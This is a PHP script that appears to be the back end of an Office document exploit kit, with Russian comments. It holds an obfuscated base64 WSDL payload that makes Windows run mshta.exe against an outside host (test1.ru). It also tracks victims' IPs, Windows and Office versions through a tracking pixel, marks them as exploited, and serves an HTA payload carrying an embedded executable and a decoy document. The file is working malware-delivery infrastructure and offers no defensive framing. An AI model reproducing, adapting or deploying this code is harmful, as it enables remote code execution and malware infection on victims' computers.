<?php

//HTA ÏÅÉËÎÀÄ
$hta=base64_decode("PAYLOADFILE");
		
$unique=false;
$exploited="no";

$ip=$_SERVER["REMOTE_ADDR"];
$uag=$_SERVER['HTTP_USER_AGENT'];

$type=$_GET['t'];
$stats=$_GET['stats'];
$thread=$_GET['thread'];
$action=$_POST['action'];
$act=$_GET['act'];

function word_to_ver($in)
	{
		switch ($in)
			{
				case 10:
					$res="XP";
					break;	
				case 11:
					$res="2003";
					break;	
				case 12:
					$res="2007";
					break;
				case 14:
					$res="2010";
					break;	
				case 15:
					$res="2013";
					break;
				case 16:
					$res="2016";
					break;	
			}
		return $res;
	}

function win_to_ver($in)
	{
		switch ($in)
			{
				case 5.0:
					$res="2000";
					break;	
				case 5.01:
					$res="2000 SP1";
					break;
				case 5.1:
					$res="XP";
					break;	
				case 5.2:
					$res="Serv 2003/XP x64";
					break;
				case 6.0:
					$res="Vista";
					break;	
				case 6.1:
					$res="7";
					break;
				case 6.2:
					$res="8";
					break;
				case 6.3:
					$res="8.1";
					break;
				case 10:
					$res="10";
					break;	
			}
		return $res;
	}


//ÓÑÒÀÍÎÂÊÀ: ÐÀÑÏÀÊÎÂÛÂÀÅÌ ÔÀÉËÛ È ÏÐÎÏÈÑÛÂÀÅÌ ÑÌÅÙÅÍÈß ÏÎ ÄÅÔÎËÒÍÎÌÓ ÏÎÒÎÊÓ Â THREADSETTINGS.TXT
if ($act=="install")
	{
		$default="[THREAD]0[EXESTART]EXE_START_DEFAULT[EXEEND]EXE_END_DEFAULT[DECOYSTART]DECOY_START_DEFAULT[DECOYEND]DECOY_END_DEFAULT[REC]\r\n";
		$empty="";
		file_put_contents("stats.txt", $empty);
		file_put_contents("threadsettings.txt", $default);
		file_put_contents("tp.php",base64_decode($type."PD9waHANCiR0aHJlYWQ9JF9HRVRbJ3RocmVhZCddOw0KZWNobyBzdHJfcmVwbGFjZSgiVEhSRUFESUQiLCAkdGhyZWFkLCBiYXNlNjRfZGVjb2RlKCJQR1JsWm1sdWFYUnBiMjV6RFFvZ0lDQWdlRzFzYm5NOUltaDBkSEE2THk5elkyaGxiV0Z6TG5odGJITnZZWEF1YjNKbkwzZHpaR3d2SWcwS0lDQWdJSGh0Ykc1ek9uTnZZWEE5SW1oMGRIQTZMeTl6WTJobGJXRnpMbmh0YkhOdllYQXViM0puTDNkelpHd3ZjMjloY0M4aURRb2dJQ0FnZUcxc2JuTTZjM1ZrY3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzkzYzJSc0wzTjFaSE1pRFFvZ0lDQWdlRzFzYm5NNmRHNXpQU0pvZEhSd09pOHZjMk5vWlcxaGN5NXRhV055YjNOdlpuUXVZMjl0TDJOc2NpOXVjeTlUZVhOMFpXMGlEUW9nSUNBZ2VHMXNibk02Ym5Nd1BTSm9kSFJ3T2k4dmMyTm9aVzFoY3k1dGFXTnliM052Wm5RdVkyOXRMMk5zY2k5dWMyRnpjMlZ0TDB4dloyOHZURzluYnlJK0RRb2dJQ0FnUEhCdmNuUlVlWEJsSUc1aGJXVTlJbEJ2Y25SVWVYQmxJaTgrRFFvZ0lDQWdQR0pwYm1ScGJtY2dibUZ0WlQwaVFtbHVaR2x1WnlJZ2RIbHdaVDBpZEc1ek9sQnZjblJVZVhCbElqNE5DaUFnSUNBZ0lDQWdQSE52WVhBNlltbHVaR2x1WnlCemRIbHNaVDBpY25CaklpQjBjbUZ1YzNCdmNuUTlJbWgwZEhBNkx5OXpZMmhsYldGekxuaHRiSE52WVhBdWIzSm5MM052WVhBdmFIUjBjQ0l2UGcwS0lDQWdJQ0FnSUNBOGMzVmtjenBqYkdGemN5QjBlWEJsUFNKdWN6QTZTVzFoWjJVaUlISnZiM1JVZVhCbFBTSk5ZWEp6YUdGc1FubFNaV1pQWW1wbFkzUWlQand2YzNWa2N6cGpiR0Z6Y3o0TkNpQWdJQ0E4TDJKcGJtUnBibWMrRFFvZ0lDQWdQSE5sY25acFkyVWdibUZ0WlQwaVUyVnlkbWxqWlNJK0RRb2dJQ0FnSUNBZ0lEeHdiM0owSUc1aGJXVTlJbEJ2Y25RaUlHSnBibVJwYm1jOUluUnVjenBDYVc1a2FXNW5JajROQ2lBZ0lDQWdJQ0FnSUNBZ0lEeHpiMkZ3T21Ga1pISmxjM01nYkc5allYUnBiMjQ5SW1oMGRIQTZMeTlzYjJOaGJHaHZjM1JmUXpwY1YybHVaRzkzYzF4VGVYTjBaVzB6TWx4dGMyaDBZUzVsZUdWZmFIUjBjRG92TDNSbGMzUXhMbkoxTDI1bGQySjFhV3hrTDNRdWNHaHdQM1JvY21WaFpEMVVTRkpGUVVSSlJDSXZQZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQSE52WVhBNllXUmtjbVZ6Y3lCc2IyTmhkR2x2YmowaVhGdzdYRnc3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRk41YzNSbGJTNUVhV0ZuYm05emRHbGpjeTVRY205alpYTnpMbE4wWVhKMEtGOTFjbXd1VTNCc2FYUW9KMThuS1ZzeFhTd2dYM1Z5YkM1VGNHeHBkQ2duWHljcFd6SmRLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0F2THlJdlBnMEtJQ0FnSUNBZ0lDQThMM0J2Y25RK0RRb2dJQ0FnUEM5elpYSjJhV05sUGcwS1BDOWtaV1pwYm1sMGFXOXVjejRnIikpOw0KPz4="));
		echo "If you see no errors here then it was installed correctly. Thanks.";
		exit;
	}

//ÏÐÎÁÈÂ: ÎÁÍÎÂËßÅÌ ÄÀÍÍÛÅ ÏÎ ÑÒÀÒÅ ÄËß ÏÎËÜÇÎÂÀÒÅËß Ñ ÊÎÍÊÐÅÒÍÛÌ IP
if ($act=="hit")
	{
		$regexp='/\[THREAD\](.+)\[IP\](\d+.\d+.\d+.\d+)\[DATE\](\d+.\d+.\d{4})\[TIME\](\d+:\d+:\d+)\[UAG\].+Windows\sNT\s(\d{1,2}\.\d{1}).+MSOffice\s(\d{2}).+\[EXP\](.+)\[REC\]/im';
		preg_match_all($regexp, file_get_contents("stats.txt"), $matches, PREG_SET_ORDER, 0);
		$j=1;
		$found="no";
		foreach ($matches as $value)
			{
					if ($value[2]==$ip)
						{
							$line=$j;
							$found="yes";
						}
					$j++;
			}
		$file=file("stats.txt"); 
		$open=fopen("stats.txt","w"); 
		for($i=0;$i<count($file);$i++) 
			{ 
				if(($i+1)!=$line)
					{
						fwrite($open,$file[$i]);
					} 
				else
					{
						fwrite($open,str_replace("[EXP]".$exploited."[REC]", "[EXP]yes[REC]", $file[$i]));
					} 
			}
		fclose($open);	
			
		exit;
	}

//ÄÎÁÀÂËÅÍÈÅ ÏÎÒÎÊÀ: ÄÎÁÀÂËßÅÌ ÄÀÍÍÛÅ ÏÎ ÑÌÅÙÅÍÈßÌ EXE È DECOY Â THREADSETTINGS.TXT
if ($action=="addthread")
	{
		$exestart=$_POST['exestart'];
		$exeend=$_POST['exeend'];
		$decoystart=$_POST['decoystart'];
		$decoyend=$_POST['decoyend'];
		$threadtoadd=$_POST['thread'];
		$threadinfo="[THREAD]".$threadtoadd."[EXESTART]".$exestart."[EXEEND]".$exeend."[DECOYSTART]".$decoystart."[DECOYEND]".$decoyend."[REC]\r\n";
		$threadsettings=file_get_contents("threadsettings.txt");
		$regexp='/\[THREAD\](.+)\[EXESTART\](\d+)\[EXEEND\](\d+)\[DECOYSTART\](\d+)\[DECOYEND\](\d+)\[REC\]/im';
		preg_match_all($regexp, $threadsettings, $matches, PREG_SET_ORDER, 0);
		$j=1;
		$found="no";
		foreach ($matches as $value)
			{
					if ($value[1]==$threadtoadd)
						{
							echo "Thread with name ".$threadtoadd." already exists! Overwriting exe and decoy offsets...";
							$line=$j;
							$replace=$threadinfo;
							$file=file("threadsettings.txt"); 
							$open=fopen("threadsettings.txt","w"); 
							for($i=0;$i<count($file);$i++) 
								{ 
									if(($i+1)!=$line)
										{
											fwrite($open,$file[$i]);
										} 
									else
										{
											fwrite($open,$replace);
										} 
								}
							fclose($open);
							$found="yes";
							break;

							
						}
					$j++;
			}
			if ($found=="no")
				{
					file_put_contents('threadsettings.txt', $threadinfo, FILE_APPEND | LOCK_EX);
				}
		exit();
	}

//ÎÒÎÁÐÀÆÅÍÈÅ ÑÒÀÒÛ
if ($stats=="show")
	{
		echo "<table border=1><tr align=center><td>Thread ID</td><td>IP</td><td>Date</td><td>Time</td><td>Windows</td><td>Word</td><td>Exploited</td></tr>";
		$regexp='/\[THREAD\](.+)\[IP\](\d+.\d+.\d+.\d+)\[DATE\](\d+.\d+.\d{4})\[TIME\](\d+:\d+:\d+)\[UAG\].+Windows\sNT\s(\d{1,2}\.\d{1}).+MSOffice\s(\d{2}).+\[EXP\](.+)\[REC\]/im';
		preg_match_all($regexp, file_get_contents("stats.txt"), $matches, PREG_SET_ORDER, 0);
		$ips=array();
		foreach ($matches as $value)
			{
				$thread=$value[1];
				$ip=$value[2];
				if ((!in_array($ip,$ips)) && ($unique == true))
					{
						array_push($ips, $ip);
						$exploited=$value[7];
						$date=$value[3];
						$time=$value[4];
						$windows=win_to_ver($value[5]);
						$office=word_to_ver($value[6]);
						echo "<tr align=center><td>".$thread."</td><td>".$ip."</td><td>".$date."</td><td>".$time."</td><td>".$windows."</td><td>".$office."</td><td>".$exploited."</td></tr>";
					}
				else
					{
						array_push($ips, $ip);
						$exploited=$value[7];
						$date=$value[3];
						$time=$value[4];
						$windows=win_to_ver($value[5]);
						$office=word_to_ver($value[6]);
						echo "<tr align=center><td>".$thread."</td><td>".$ip."</td><td>".$date."</td><td>".$time."</td><td>".$windows."</td><td>".$office."</td><td>".$exploited."</td></tr>";
					}
			}

		echo "</table>";
		
		$id="0";
		echo "<table border=1 align=right><tr align=center><td>Doc ID</td></tr><tr>";

		echo "<td><a href=''>".$id."</a></td>";
		echo "</tr>";
		echo "</table>";

		exit();
	}

//ÄÎÁÀÂËÅÍÈÅ ÞÇÅÐÀ Â ÑÒÀÒÓ
if ($stats=="send")
	{
		$date=date("d/m/Y", strtotime("now"));
		$time=date("h:i:s", strtotime("now"));
		$statsfile = fopen("stats.txt", "a") or die("Unable to open write stats file!");
		fwrite($statsfile, "[THREAD]".$thread."[IP]".$ip."[DATE]".$date."[TIME]".$time."[UAG]".$uag."[EXP]".$exploited."[REC]"."\r\n");
		fclose($statsfile);
		
		header('Content-Type: image/png');
		$pixel=base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAMSURBVBhXY/j//z8ABf4C/qc1gYQAAAAASUVORK5CYII=");
		echo $pixel;

		exit();
	}

//ÎÒÄÀ×À ÏÅÉËÎÀÄÀ: ÎÒÄÀÅÌ HTA ÏÅÉËÎÀÄ Ñ ÏÐÎÏÈÑÀÍÍÛÌÈ ÑÌÅÙÅÍÈßÌÈ ÄËß ÓÊÀÇÀÍÍÎÃÎ ÏÎÒÎÊÀ
if (($type=="h") Or (isset($_GET['thread'])) Or (isset($_GET['d'])))
	{
		if (isset($_GET['d']))
			{
				$thread=$_GET['d'];
			}
		
		$threadsettings=file_get_contents("threadsettings.txt");
		$regexp='/\[THREAD\](.+)\[EXESTART\](\d+)\[EXEEND\](\d+)\[DECOYSTART\](\d+)\[DECOYEND\](\d+)\[REC\]/im';
		preg_match_all($regexp, $threadsettings, $matches, PREG_SET_ORDER, 0);
		foreach ($matches as $value)
			{
					if ($value[1]==$thread)
						{
							$exestart=$value[2];
							$exeend=$value[3];
							$decoystart=$value[4];
							$decoyend=$value[5];
							break;
						}
			}
		$hta = str_replace("EXE_START", $exestart, $hta);
		$hta = str_replace("EXE_END", $exeend, $hta);
		$hta = str_replace("DECOY_START", $decoystart, $hta);
		$hta = str_replace("DECOY_END", $decoyend, $hta);
		header('Content-Type: application/hta');
		echo $hta;
	}



?>
